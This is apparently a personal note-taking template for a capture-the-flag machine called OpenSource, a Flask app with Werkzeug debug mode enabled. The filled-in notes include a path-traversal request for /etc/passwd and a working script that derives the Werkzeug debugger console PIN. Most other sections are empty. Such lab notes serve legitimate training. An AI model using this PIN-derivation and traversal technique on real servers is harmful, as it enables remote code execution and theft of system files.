


# <span style="color:[COLOR]">Machine #27 OpenSource</span>  



## <span style="color:[COLOR]">Checklist 🤓   



<br/><br/>


## <span style="color:[COLOR]">What Do We Have? 🤔🤔 
* `'/app/public/uploads/'`.
* The backend is Python.
* It's opensource (obviously).
* I have the code.
* It shows me an error when I press upload without supplying any file.
* I think I can see the error because DEBUG mode is true.
* The upload page seems to be using `Werkzeug`.
* I think we're in a testing environment (Not sure) in the demo that they provided.
* There are two methods `get_file_name` and `get_unique_file_name` and only the first one is being used.
* What the hell is this!   
```html
   <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "QNJYyPKHPwUQu1DNLaas";
    </script>
```

```
GET /upcloud?__debugger__=yes&cmd=resource&f=../../../../../../../../etc/passwd
```
  
* The code that might get me the pin of the console  
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```  
* I need to generate the PIN but I don't have the username of the user who created the flask process and I also need other info that I should get through some kind of a directory traversal.

<br/><br/>


## <span style="color:[COLOR]">Random Notes👀

<br/><br/>  


## <span style="color:[COLOR]">How Did I Own This Shit 😎🥳  

<br/><br/>



## <span style="color:[COLOR]">Where I Got Stuck?😡😧  


<br/><br/>



## <span style="color:[COLOR]">What Did I learn from this Machine?👀  


<br/><br/>



## <span style="color:[COLOR]">Writeups ✍🏽📓   


<br/><br/>

<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->